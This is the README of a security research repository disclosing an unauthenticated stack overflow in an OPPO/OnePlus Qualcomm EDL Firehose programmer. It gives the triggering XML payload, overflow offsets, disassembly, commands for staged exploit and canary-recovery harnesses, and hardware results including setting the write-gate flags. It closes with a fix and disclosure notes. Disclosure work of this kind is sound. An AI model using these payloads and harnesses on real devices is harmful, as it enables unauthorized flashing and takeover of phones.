# Qualcomm EDL Firehose Programmer — Unauthenticated Stack Overflow via `<read label>`

**Security audit report and proof-of-concept**

| | |
|---|---|
| **Affected component** | `prog_firehose_ddr.elf` — Qualcomm EDL (Firehose) programmer, OPPO/OnePlus variant |
| **Affected device (tested)** | OnePlus 15T (PLZ110), Snapdragon 8 Gen 5 (SM8850, "kaanapali"), OxygenOS/ColorOS 16.0.4.603 |
| **Affected firmware** | sha256 `31ad5664023af3f9022913272e2c180fde5f658f31c9094ae9ec57c128c59086`, 295,636 bytes, ELF64 AArch64, build string `Jul 22 2025 - 15:41:08`, `SM8850_V1.0.05` |
| **Class** | CWE-787 / CWE-121 — stack-based buffer overflow with host-controlled length |
| **Reachability** | Unauthenticated. Two XML commands over the EDL USB interface; no OSIG signature, no digest table, no write permission required |
| **Impact** | Memory corruption in the programmer: overwrite of the stack canary, saved `x29` and saved `x30` (return address). Confirmed on hardware as reliable control-flow hijack up to arbitrary code execution in the programmer, subject to the canary constraint documented in §6 |
| **Cross-generation** | The identical dead-bound copy exists in OPPO-lineage programmers for SM8650 (8 Gen 3) and SM8750 (8 Elite) — see §9 |
| **Status** | No public CVE covers this defect. Vendor report prepared — see [docs/DISCLOSURE.md](docs/DISCLOSURE.md) |

---

## 1. Executive summary

The OPPO/OnePlus build of Qualcomm's EDL Firehose programmer contains a stack buffer
overflow in the handler for the `<read>` command. The handler copies the host-supplied
`label` XML attribute into a fixed 0xD8-byte stack buffer using
`vsnprintf(dst, strlen(label) + 1, "%s", label)`.

The length check immediately above the copy is dead code: it compares
`strlen("label")` — the length of the *literal string* `"label"`, always 5 — against
the intended maximum of 0x47, so the "too long" branch can never be taken. The copy
size is then recomputed from the *host-supplied* attribute value. The result is a
fully attacker-controlled stack overwrite in a component that is uploaded and executed
before any authorization step.

The bug is reachable with two unauthenticated XML commands:

```xml
<?xml version="1.0" ?><data>
<configure MemoryName="ufs" ModeType="5" Verbose="0" AlwaysValidate="0"
           EnableFlash="1" MaxDigestTableSizeInBytes="8192"
           MaxPayloadSizeToTargetInBytes="1048576" ZlpAwareHost="1"
           SkipStorageInit="0" />
<read SECTOR_SIZE_IN_BYTES="512" num_partition_sectors="1"
      physical_partition_number="0" start_sector="0" label="AAAA…(≥320 bytes)" />
</data>
```

What the overflow reaches, in order:

| label length | bytes written | reaches |
|---|---|---|
| 0x00–0x47 | 1–0x48 | in-bounds only |
| 0x48 | 0x49 | canary byte 0 |
| 0x4F | 0x50 | full 8-byte canary |
| 0x58 | 0x59 | + saved `x30` byte 0 (return address) |
| 0x5F | 0x60 | full saved `x30` |
| 0x9F | 0xA0 | + saved `x28,x24,x23,x22,x21,x20,x19` |
| 0xA0+ | 0xA1+ | past the frame into the caller |

**Scope of impact — read this before filing or copying anything.** This is memory
corruption in the programmer, *not* a bypass of the OSIG write gate. `flag1`
(`0x8046bbc0`), the byte every write command consults, has exactly one writer in the
whole image and it is reached only from the successful RSA-2048 path in `<verify>`.
What the overflow buys is an unauthenticated write into the programmer's own stack —
which, on the tested unit, was pushed to full same-session code execution (§6) — but
the write gate itself is a separate, single-writer variable. §7 of the writeup is
explicit about that distinction, and a report that conflates the two will be closed
as invalid.

Full technical writeup: **[docs/WRITEUP.md](docs/WRITEUP.md)**.
Hardware validation log: **[docs/LAB_RESULTS.md](docs/LAB_RESULTS.md)**.
Disclosure template: **[docs/DISCLOSURE.md](docs/DISCLOSURE.md)**.

## 2. Repository layout

```
docs/WRITEUP.md            full advisory: background, RE setup, the bug,
                           reachability, negative results, chain analysis
docs/CHAIN_NOTES.md        chain analysis: the one-slot theorem, the one-shot
                           pivot, why every multi-slot idea failed
docs/EXEC_NOTES.md        the fixed-stack discovery: the label is code — same-
                           session execution construction and byte constraints
docs/LAB_RESULTS.md        what was proven on hardware, and what blocked the
                           final step on the tested unit
docs/DISCLOSURE.md         coordinated-disclosure notes, suggested fix, lineage
tools/fhcore.py            ELF segment map, key extraction, live EDL session plumbing
tools/audit_firehose.py    static audit: gate census, dispatch table, copy-site
                           scanner, gadget scan (no device needed)
tools/dump_evidence.py     regenerates evidence/ from the programmer binary
tools/exploit_label_oob.py staged overflow harness (fingerprint / canary / control)
tools/flag1_chain.py       chain research harness (probe / oracle / pivot / flash)
tools/exec_label.py        same-session code-execution harness (probe / oracle / arm)
tools/oracle_loop.py       unattended bytewise canary recovery across power cycles
tools/lineage_scan.py      byte-pattern scanner for the same defect in other builds
evidence/                  machine-generated disassembly dumps, with the binary's
                           sha256 in every file header
```

## 3. Quick start — static analysis (no device)

```bash
pip install -r requirements.txt

# ELF = prog_firehose_ddr.elf, sha256 31ad5664…c59086
python tools/audit_firehose.py $ELF                 # dispatch table + copy-site scan
python tools/audit_firehose.py $ELF --gates         # who reads/writes flag1
python tools/audit_firehose.py $ELF --copies         # every string-copy call site
python tools/audit_firehose.py $ELF --gadgets       # pivots and useful gadgets
python tools/audit_firehose.py $ELF --disasm 0x149a433c 0x60
python tools/dump_evidence.py $ELF                  # rebuild evidence/
```

`audit_firehose.py` prints the file's sha256 and warns loudly if the binary is not the
one the offsets were derived from.

## 4. Quick start — live stages (needs a 9008 device)

```bash
# 0. see what the harness would send, without touching hardware
python tools/exploit_label_oob.py --dry-run

# 1. confirm the copy path is reachable (stays below the canary)
python tools/exploit_label_oob.py --stage fingerprint

# 2. is the canary a firmware constant or live entropy?
python tools/exploit_label_oob.py --stage canary

# 3. bytewise canary recovery (each wrong guess parks the CPU; resumable)
python tools/oracle_loop.py --port COM6

# 4. same-session code execution (only with a NUL-free, quote-free canary)
python tools/exec_label.py --stage arm-noflag        # exec + resync only (safe check)
python tools/exec_label.py --stage arm               # flag1 := 1 in the live session
```

Live mode runs the full Sahara upload chain, so it expects the device's EDL package
layout; pass `--images` / `--elf` if yours differs.

### Warnings, in order of importance

1. A wrong canary guess **hangs the programmer's command loop** (a non-returning spin
   at `0x149a006c`). The USB device stays enumerated and looks fine. Recovery is a
   long power-press. Do not run the oracle on a device you cannot physically reset.
2. Do not run any of this during a flash. A hung programmer mid-`program` is precisely
   the bricked state this research started from.
3. There is no automatic weaponized chain by design. The tools stop where the evidence
   stops; every stage prints what it proves and what it does not.

## 5. The bug in one screen

```
0x149a435c  adrp x0,#0x149d4000
0x149a4360  add  x0,x0,#0x73        ; x0 = &"label"   (the literal)
0x149a4364  bl   0x1499b1c0         ; strlen("label") == 5
0x149a4368  cmp  x0,#0x47
0x149a436c  b.hi 0x149a43f0          ; dead code: 5 <= 0x47, never taken
0x149a4370  mov  x0,x21              ; <-- x0 is the HOST pointer again
0x149a4374  bl   0x1499b1c0          ; n = strlen(host label)
0x149a4378  add  x1,x0,#1            ; size = n + 1
0x149a4384  sub  x0,x29,#0x50        ; dst = fixed 0xD8 stack buffer
0x149a4388  mov  x3,x21
0x149a438c  bl   0x1499b158          ; bounded copy, with an attacker-chosen bound
```

The author wrote a 0x48-byte bound — the unreachable error path even formats the
message with the constant `0x48` — and then let the bound-check operand be clobbered by
the value it was meant to check. `strlen("label")` is 5, `0x47` is 71, so `b.hi` is
always false and the guard is dead code.

## 6. What was proven on hardware (short version)

On the tested PLZ110 unit, all of the following were confirmed live, not inferred
(full log: [docs/LAB_RESULTS.md](docs/LAB_RESULTS.md)):

* The overflow reaches and overwrites saved `x30`; a label whose `x30` slot holds the
  buffer address executes the label bytes at `0x149ddee0` — the programmer pins `sp`
  to a fixed literal at entry, so the landing address is known and the stack pages are
  mapped PXN=0 at EL1. **The label is code.**
* A five-word payload (`nop; mov w0,#0x101; bl set_flag1; bl set_flag3; b resync`)
  ran, set both write-gate bytes, and rejoined the dispatcher loop; the session stayed
  up and `<program>` stopped answering `download is not allowed`.
* The canary is stable across power cycles on this unit
  (`22 01 01 01 01 01 01 01`), so one bytewise recovery covers every later attempt.

The final blocker on the tested unit is structural, not tuning: the canary's first byte
is `0x22` — a double quote. The programmer's XML parser does not entity-decode
attribute values, and a raw `0x22` terminates the attribute, so a single `<read>`
cannot simultaneously reproduce the canary and continue on to saved `x30`. On that
unit the overflow is a canary-exact, non-hijacking overwrite; on any unit whose canary
does not contain a quote (or the shipped constant `0xC0C0C0C0`, whose NULs block it a
different way), the exec path applies as built.

## 7. Why this is not an OSIG bypass

`flag1` (`0x8046bbc0`) is written in exactly one place, `0x149aabd0`, which has
exactly one caller, `0x149a2c14`, inside the `<verify>` success path after an
RSA-2048 PKCS#1 v1.5 / SHA-256 check over the device's challenge. No XML command, no
attribute, and no state reachable through `<configure>` touches it. The overflow gives
code execution in the programmer's own process; it does not forge a signature. If it
is chained, the natural target is the programmer's own globals — including `flag1` —
which is what makes it interesting at all. The remaining distance is documented rather
than hand-waved; see WRITEUP §6–§7 and LAB_RESULTS.

## 8. Suggested fix

```c
/* before: the bound is computed from the literal, then clobbered */
len = strlen("label");           /* 5 */
if (len > 0x48) goto too_long;   /* dead */
len = strlen(host_label);        /* wrong value from here on */
snprintf(buf, len + 1, "%s", host_label);

/* after: one length, one check, one copy */
len = strlen(host_label);
if (len + 1 > sizeof(buf))       /* sizeof(buf) == 0xD8 */
    goto too_long;
snprintf(buf, sizeof(buf), "%s", host_label);
```

or reject over-long `label` values in the XML attribute parser before the handler
runs.

## 9. Cross-generation lineage

A byte-pattern scan (`tools/lineage_scan.py`) of OPPO-lineage programmers finds the
identical dead-bound sequence in three SoC generations:

| SoC | programmer build | vulnerable copy (VA) |
|---|---|---|
| SM8650 (8 Gen 3) | OPPO SM8650 Chimera V1.0.21 | 0x149a2844 |
| SM8750 (8 Elite) | OPPO SM8750 Chimera V1.0.05 | 0x149a45ac |
| SM8850 (8 Gen 5) | OnePlus 15T `prog_firehose_ddr.elf` | 0x149a4368 |

In each: `cmp x0,#0x47` (comparing `strlen("label")`, a constant 5), `b.hi` to the
unreachable error path, then `add x1,x0,#1` / `sub x0,x29,#0x50` — the copy with a
host-controlled size into the fixed stack buffer. Register allocation and literal
addresses differ (independent recompilation); the structure is identical. Every
OPPO/OnePlus/realme device whose EDL programmer descends from this line — 8 Gen 3
through 8 Gen 5 flagships at minimum — ships the same defect.

## 10. Scope and legal

The analysis is of *shipped* production firmware on a device the author owns. No
vendor firmware blobs are included in this repository (see `.gitignore` — the
programmer ELF is deliberately excluded); reference the sha256 and build string
instead. No vendor private keys are included or extracted; the RSA moduli printed in
`evidence/command_table.txt` are public keys, shown for verification only. Nothing
here forges or bypasses a signature.

## 11. License

MIT — see [LICENSE](LICENSE).
